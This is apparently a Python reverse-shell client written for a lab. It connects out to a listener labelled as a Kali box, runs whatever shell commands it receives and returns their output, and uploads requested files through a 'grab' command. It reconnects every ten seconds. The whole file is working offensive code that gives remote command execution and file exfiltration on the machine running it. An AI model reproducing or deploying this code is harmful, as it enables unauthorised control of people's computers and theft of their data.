#!/usr/bin/env python
#Python 3

#Client

import socket
import subprocess
import sys
import time
import os

#Kali box
SERV_ADDRESS = ("192.168.0.200", 8080)
state = True
CHUNK = 1024

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(SERV_ADDRESS)
    return s

def transfer(conn, path):
    if os.path.exists(path):
        print("path ", path)
        with open(path, 'rb') as f:
            chunk = f.read(CHUNK)
            while len(chunk) > 0:
                conn.send(chunk)
                chunk = f.read(CHUNK)
            conn.send('DONE'.encode())
    else:
        conn.send('File not found'.encode())

def try2connect(socket):
    global state, total

    while(True):
        command = socket.recv(CHUNK)
        print("command %s" % command)
        if 'exit' in command.decode():
            socket.close()
            state = False
            break
        elif "restart" in command.decode():
            total = 0
            make_connection()
            socket.close()
        elif "cd " in command.decode():
            directory = command.decode()[3:]
            os.chdir(directory)
        elif "grab" in command.decode():
            grab, path = command.decode().split("*")
            print("grab", grab)
            print("path", path)
            transfer(socket, path)
        else:
            run_shell(socket, command)

def run_shell(socket, command):
    cmd = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    socket.send(cmd.stdout.read())
    socket.send(cmd.stderr.read())

def make_connection():
    global total, delay

    try:
        socket = create_socket()
        print("Connected")
        while not (socket.connect_ex(SERV_ADDRESS) == 0):
            try2connect(socket)
    except:
    #except [ConnectionRefusedError, ConnectionResetError]:
        total += delay
        times = total/delay
        print('Retry in {} seconds already tried {} times'.format(delay, int(times))) if state else print("Exit program")
        time.sleep(delay)

total = 0
delay = 10

while(state):
    make_connection()
